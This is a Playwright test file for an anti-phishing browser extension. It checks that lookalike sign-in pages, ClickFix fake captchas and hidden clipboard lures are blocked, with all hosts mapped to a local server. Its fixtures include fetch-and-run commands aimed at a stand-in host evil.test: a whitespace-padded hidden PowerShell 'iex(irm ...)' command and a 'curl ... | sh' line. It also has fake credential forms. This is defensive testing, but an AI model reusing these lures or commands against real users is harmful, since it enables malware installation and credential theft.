/**
 * Loads the built extension (dist/) into Chromium and drives real navigations.
 * Every hostname resolves to a local fixture server (--host-resolver-rules), so no
 * request ever reaches a real phishing host.
 */
import { test, expect, chromium, type BrowserContext, type Worker } from "@playwright/test";
import { hiddenLureBodies } from "./hidden-lures";
import { hostedDocsPage } from "./hosted-docs";
import { componentHookPage } from "./component-hook";
import { builtinOverridePages } from "./builtin-overrides";
import { splitCommandPage, unreadableCommandPages } from "./unreadable-command";
import { shadowFillerPage } from "./shadow-filler";
import { sectionCopyPage } from "./section-copy";
import { macosLurePage } from "./macos-lure";
import { DYNAMIC_RULE_ID_LIVE_START, REPORT_GITHUB_REPO } from "../../src/shared/constants";
import { createServer, type Server } from "node:http";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

const dist = resolve(process.cwd(), "dist");

const PAGES: Record<string, string> = {
  "/clean": "<!doctype html><title>Weather today</title><h1>Sunny</h1><p>Nothing to see.</p>",
  "/start": `<!doctype html><title>Sign in to your Microsoft account</title>
    <form action="/collect" method="post"><input type="email" name="loginfmt"><input type="password" name="passwd"><button>Sign in</button></form>`,
  "/clickfix": `<!doctype html><title>Just a moment</title>
    <h1>Verify you are human</h1><p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
    <button id="verify" onclick="var t=document.createElement('textarea');var cmd='powershell -w hidden -c iex(irm http://evil.test/p)';var pad=' '.repeat(13000)+String.fromCharCode(160,8192,12288,8203);t.value=pad+cmd+' #'+'a'.repeat(13000);t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
  "/crashfix": `<!doctype html><title>Aw, Snap</title>
    <h1>Chrome has crashed</h1><p>Your browser is out of date. Paste the fix.</p>
    <button id="fix" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://evil.test/fix.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Fix Chrome</button>`,
  "/installer": `<!doctype html><title>Install</title><h1>Install the CLI</h1>
    <button id="copy" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://example.test/install.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`,
  "/account": `<!doctype html><title>Sign in</title>
    <form action="/session" method="post"><input type="email" name="email"><input type="password" name="password"><button>Sign in</button></form>`,
  "/dl": `<!doctype html><title>Downloads</title><a id="dl" href="/setup.exe" download>Download</a>`,
};

const copiedButton = (PAGES["/crashfix"] ?? "").replace('id="fix"', 'id="copy"').match(/<button id="copy"[\s\S]*<\/button>/)?.[0] ?? "";
const step = (PAGES["/clickfix"] ?? "").match(/Press Windows \+ R/)?.[0] ?? "";
for (const [path, body] of Object.entries(hiddenLureBodies(step))) {
  PAGES[path] = path === "/iframe-text" ? body : `${body}${copiedButton}`;
}
const docsCommand = (PAGES["/installer"] ?? "").match(/t\.value='([^']+)'/)?.[1] ?? "";
PAGES["/hosted-docs"] = hostedDocsPage(docsCommand);
PAGES["/components"] = componentHookPage();
const strongCommand = (PAGES["/clickfix"] ?? "").match(/var cmd='([^']+)'/)?.[1] ?? "";
for (const [path, body] of Object.entries(builtinOverridePages(strongCommand, docsCommand, step))) PAGES[path] = body;
for (const [path, body] of Object.entries(unreadableCommandPages(docsCommand))) PAGES[path] = body;
PAGES["/hosted-split"] = splitCommandPage(docsCommand);
PAGES["/shadow-filler"] = `${shadowFillerPage(step)}${copiedButton}`;
PAGES["/section-copy"] = sectionCopyPage(docsCommand, true);
PAGES["/section-hidden"] = sectionCopyPage(docsCommand, false);
PAGES["/macos-lure"] = macosLurePage();

let server: Server;
let port = 0;
let context: BrowserContext;
let worker: Worker;
let profile = "";

test.beforeAll(async () => {
  server = createServer((req, res) => {
    const path = (req.url ?? "/").split("?")[0] ?? "/";
    if (path === "/setup.exe") {
      res.writeHead(200, { "Content-Type": "application/octet-stream", "Content-Disposition": 'attachment; filename="setup.exe"' });
      res.end(Buffer.alloc(64 * 1024, 1));
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(PAGES[path] ?? PAGES["/clean"]);
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", () => done()));
  const address = server.address();
  port = typeof address === "object" && address ? address.port : 0;

  profile = mkdtempSync(join(tmpdir(), "fundament-e2e-"));
  // FUNDAMENT_E2E_BROWSER: path to a Chromium-based browser that still accepts --load-extension
  // (Playwright's Chromium by default; Edge works when security software quarantines it).
  const executablePath = process.env.FUNDAMENT_E2E_BROWSER || undefined;
  context = await chromium.launchPersistentContext(profile, {
    ...(executablePath ? { executablePath } : { channel: "chromium" }),
    headless: true,
    acceptDownloads: true,
    args: [
      `--disable-extensions-except=${dist}`,
      `--load-extension=${dist}`,
      "--host-resolver-rules=MAP * 127.0.0.1",
    ],
  });
  worker = context.serviceWorkers()[0] ?? (await context.waitForEvent("serviceworker"));
  // Let onInstalled finish applying rulesets.
  await expect.poll(async () => worker.evaluate(async () => (await chrome.declarativeNetRequest.getEnabledRulesets()).length)).toBeGreaterThan(3);
});

test.afterAll(async () => {
  await context?.close();
  server?.close();
  if (profile) rmSync(profile, { recursive: true, force: true });
});

async function freshPage() {
  const page = await context.newPage();
  return page;
}

test("an ordinary page loads without an interstitial", async () => {
  const page = await freshPage();
  await page.goto(`http://weather-news.example:${port}/clean`);
  await page.waitForTimeout(800);
  expect(page.url()).toContain("/clean");
  await page.close();
});

test("the page timeline does not show that Fundament is installed", async () => {
  const page = await freshPage();
  await page.goto(`http://weather-news.example:${port}/clean`);
  await page.waitForTimeout(1500);
  const names = await page.evaluate(() => performance.getEntriesByType("measure").map((entry) => entry.name));
  expect(names.filter((name) => /fundament/i.test(name))).toEqual([]);
  await page.close();
});

test("a brand-lookalike sign-in URL is stopped before the page is used", async () => {
  const page = await freshPage();
  await page.goto(`http://paypal-login.secure-check.xyz:${port}/signin`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await expect(page.locator(".host")).toContainText("paypal-login.secure-check.xyz");
  await page.close();
});

test("a false-alarm report shows the host and not the address, then opens a public issue", async () => {
  const page = await freshPage();
  const token = "super-secret-token";
  await page.goto(`http://paypal-login.secure-check.xyz:${port}/signin?token=${token}`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await expect(page.getByRole("button", { name: /fehlalarm|false alarm/i })).toBeVisible();
  await page.getByRole("button", { name: /fehlalarm|false alarm/i }).click();
  const preview = page.locator(".report-preview");
  await expect(preview).toContainText("paypal-login.secure-check.xyz");
  await expect(preview).toContainText(/öffentlich sichtbar|publicly visible/i);
  await expect(preview).toContainText("imp-keyword");
  await expect(preview).not.toContainText(token);
  await expect(preview).not.toContainText("signin");
  // Every host is mapped to 127.0.0.1, so the GitHub tab dies as chrome-error and
  // Edge does not emit a Playwright request. webNavigation still sees the URL
  // the extension asked to open.
  await worker.evaluate(() => {
    const g = globalThis as unknown as { __reportNav?: string[] };
    g.__reportNav = [];
    chrome.webNavigation.onBeforeNavigate.addListener((details) => {
      if (details.url.startsWith("https://github.com/")) g.__reportNav?.push(details.url);
    });
  });
  const opened = context.waitForEvent("page");
  await page.getByRole("button", { name: /github/i }).click();
  const reportPage = await opened;
  await expect
    .poll(() => worker.evaluate(() => (globalThis as unknown as { __reportNav?: string[] }).__reportNav ?? []))
    .not.toEqual([]);
  const hits = await worker.evaluate(() => (globalThis as unknown as { __reportNav?: string[] }).__reportNav ?? []);
  const hit = hits.find((target) => target.startsWith(`https://github.com/${REPORT_GITHUB_REPO}/issues/new`)) ?? "";
  expect(hit.startsWith(`https://github.com/${REPORT_GITHUB_REPO}/issues/new`)).toBe(true);
  expect(decodeURIComponent(hit)).not.toContain(token);
  expect(decodeURIComponent(hit)).not.toContain("signin");
  expect(new URL(hit).pathname).toBe(`/${REPORT_GITHUB_REPO}/issues/new`);
  await reportPage.close();
  await page.close();
});

test("a page that claims to be Microsoft and asks for a password is stopped", async () => {
  const page = await freshPage();
  await page.goto(`http://account-portal.example:${port}/start`);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.locator("button.ghost", { hasText: /why|warum/i }).click();
  await expect(page.locator(".why")).toContainText(/brand-content/);
  await page.close();
});

test("a macOS lure that says Cmd+Space cannot copy a substituted curl", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://cdn-check.example:${port}/macos-lure`);
  await page.locator("#copy").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

test("a ClickFix fake captcha cannot put its command on the clipboard", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://cdn-check.example:${port}/clickfix`);
  await page.locator("#verify").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

test("the worker loads the popularity list: a brand's secondary domain is not a lookalike", async () => {
  const page = await freshPage();
  await page.goto(`http://netflix.net:${port}/clean`);
  await page.waitForTimeout(1200);
  const ids = await worker.evaluate(async () => {
    const all = await chrome.storage.session.get(null);
    const record = Object.values(all).find((v) => (v as { url?: string }).url?.includes("netflix.net")) as
      | { analysis?: { signals: { id: string; weightApplied: number }[] } }
      | undefined;
    return (record?.analysis?.signals ?? []).filter((s) => s.id === "popular" || s.weightApplied > 0).map((s) => s.id);
  });
  expect(ids).toContain("popular");
  expect(ids).not.toContain("impersonation");
  await page.close();
});

test("a kit on a popular platform does not borrow the platform's reputation", async () => {
  const page = await freshPage();
  await page.goto(`http://paypal-login.weebly.com:${port}/account`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

for (const path of ["/override-test", "/override-inner", "/override-now", "/override-box"]) {
  test(`a page that replaces one builtin still cannot copy a lure (${path})`, async () => {
    expect(strongCommand.length).toBeGreaterThan(10);
    expect(docsCommand.length).toBeGreaterThan(10);
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await freshPage();
    await page.goto(`http://tool-docs.example:${port}${path}`);
    await page.locator("#copy").click();
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
    await page.close();
  });
}

test("a fake browser-crash page cannot copy a shell command", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://cdn-check.example:${port}/crashfix`);
  await page.locator("#fix").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

test("a visible install command on a github.io doc is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://project-docs.github.io:${port}/hosted-docs`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/hosted-docs");
  await page.close();
});

test("a visible install command split across spans on a github.io doc is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://project-docs.github.io:${port}/hosted-split`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/hosted-split");
  await page.close();
});

test("a github.io page that copies a visible command inside a longer block is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://project-docs.github.io:${port}/section-copy`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/section-copy");
  await page.close();
});

test("a longer block still warns when its command is not on the page", async () => {
  const page = await freshPage();
  await page.goto(`http://project-docs.github.io:${port}/section-hidden`);
  await page.locator("#copy").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  await page.close();
});

for (const path of ["/ink-lure", "/tiny-lure", "/fade-lure", "/offscreen-lure", "/clip-lure"]) {
  test(`an unreadable command on a hosting zone still warns (${path})`, async () => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await freshPage();
    await page.goto(`http://fundament-lure-probe.weebly.com:${port}${path}`);
    await page.locator("#copy").click();
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
    await page.close();
  });
}

test("a real installer copy button on a normal page is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/installer`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/installer");
  await page.close();
});

test("a weak command stays on a popular install page when the instruction is only a picture", async () => {
  const page = await freshPage();
  await page.goto(`http://netflix.net:${port}/img-lure`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/img-lure");
  await page.close();
});

for (const path of ["/img-lure", "/canvas-lure", "/iframe-lure"]) {
  test(`a hidden instruction on a hosting-zone page cannot copy a shell command (${path})`, async () => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await freshPage();
    await page.goto(`http://fundament-lure-probe.weebly.com:${port}${path}`);
    if (path === "/iframe-lure") await page.waitForTimeout(400);
    await page.locator("#copy").click();
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
    await page.close();
  });
}

for (const path of ["/late-300", "/late-3000", "/shadow-deep", "/iframe-seventh"]) {
  test(`a lure past the old element cap cannot copy a shell command (${path})`, async () => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await freshPage();
    await page.goto(`http://tool-docs.example:${port}${path}`);
    if (path === "/iframe-seventh") await page.waitForTimeout(400);
    const started = Date.now();
    await page.locator("#copy").click();
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
    if (path === "/late-3000") expect(Date.now() - started).toBeLessThan(1000);
    await page.close();
  });
}

test("a visible lure is still read when filler shadow roots come first", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/shadow-filler`);
  const started = Date.now();
  await page.locator("#copy").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  expect(Date.now() - started).toBeLessThan(1000);
  await page.close();
});

test("a closed-shadow lure still blocks after 10000 removed components", async () => {
  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/shadow-churn`);
  const started = Date.now();
  await page.locator("#copy").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
  expect(Date.now() - started).toBeLessThan(1000);
  await page.close();
});

test("a sealed attachShadow still behaves on a page of custom elements", async () => {
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/components`);
  await expect(page.locator("#hook")).toHaveText("hook-ok");
  await page.close();
});

for (const path of ["/shadow-open", "/shadow-closed", "/css-lure"]) {
  test(`a hidden instruction in the page tree cannot copy a shell command (${path})`, async () => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    const page = await freshPage();
    await page.goto(`http://tool-docs.example:${port}${path}`);
    await page.locator("#copy").click();
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
    await page.close();
  });
}

test("the same picture lure on an ordinary host is left alone", async () => {
  const page = await freshPage();
  await page.goto(`http://tool-docs.example:${port}/img-lure`);
  await page.locator("#copy").click();
  await page.waitForTimeout(1200);
  expect(page.url()).toContain("/img-lure");
  await page.close();
});

test("a host from the shipped phishing feed is redirected, and Continue works", async () => {
  const feed = readFileSync(resolve(process.cwd(), "filters/feeds/phishing-hosts.txt"), "utf8").split("\n");
  const host = feed.find((h) => /^[a-z0-9-]+\.[a-z]{2,}$/.test(h) && !h.endsWith(".example")) ?? feed[0];
  const page = await freshPage();
  await page.goto(`http://${host}:${port}/clean`).catch(() => undefined);
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html?blocked=feed");
  await expect(page.locator(".reason")).toContainText(/phishing/i);
  await page.locator("button.continue").click();
  await page.locator("button.continue.danger").click();
  await expect.poll(() => page.url(), { timeout: 8000 }).toContain(`${host}:${port}/clean`);
  await page.close();
});

test("a host in the last shipped phishing-feed rule is redirected", async () => {
  const rules = JSON.parse(readFileSync(resolve(dist, "rules/threats-feed.json"), "utf8")) as {
    id: number;
    condition: { requestDomains: string[] };
  }[];
  const first = rules[0];
  const last = rules[rules.length - 1];
  expect(rules.length).toBeGreaterThan(1);
  expect(last?.id).not.toBe(first?.id);
  const head = last?.condition.requestDomains[0];
  const tail = last?.condition.requestDomains[last.condition.requestDomains.length - 1];
  expect(head).toBeTruthy();
  expect(tail).toBeTruthy();
  expect(tail).not.toBe(head);
  for (const host of [head, tail]) {
    const page = await freshPage();
    await page.goto(`http://${host}:${port}/clean`).catch(() => undefined);
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html?blocked=feed");
    await page.close();
  }
});

test("a dynamic rule at the live-feed id redirects only its own host", async () => {
  const probe = "live-rule-probe.example";
  const other = "live-rule-other.example";
  await worker.evaluate(async (ruleId) => {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [ruleId],
      addRules: [
        {
          id: ruleId,
          priority: 5,
          action: { type: "redirect" as chrome.declarativeNetRequest.RuleActionType, redirect: { extensionPath: "/warning.html?blocked=feed" } },
          condition: {
            requestDomains: ["live-rule-probe.example"],
            resourceTypes: ["main_frame", "sub_frame"] as chrome.declarativeNetRequest.ResourceType[],
          },
        },
      ],
    });
  }, DYNAMIC_RULE_ID_LIVE_START);
  try {
    const bystander = await freshPage();
    await bystander.goto(`http://${other}:${port}/clean`);
    expect(bystander.url()).toContain(`http://${other}:${port}/clean`);
    await bystander.close();

    const page = await freshPage();
    await page.goto(`http://${probe}:${port}/clean`).catch(() => undefined);
    await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html?blocked=feed");
    await page.close();
  } finally {
    await worker.evaluate(async (ruleId) => {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [ruleId] });
    }, DYNAMIC_RULE_ID_LIVE_START);
  }

  const after = await freshPage();
  await after.goto(`http://${probe}:${port}/clean`);
  expect(after.url()).toContain(`http://${probe}:${port}/clean`);
  await after.close();
});

test("a program downloaded over plain HTTP is cancelled", async () => {
  const page = await freshPage();
  await page.goto(`http://files.example:${port}/dl`);
  await page.locator("#dl").click();
  await expect
    .poll(
      async () =>
        worker.evaluate(async () => {
          const items = await chrome.downloads.search({});
          return items.length === 0 ? "erased" : items.map((i) => i.state).join(",");
        }),
      { timeout: 8000 },
    )
    .toMatch(/erased|interrupted/);
  await page.close();
});
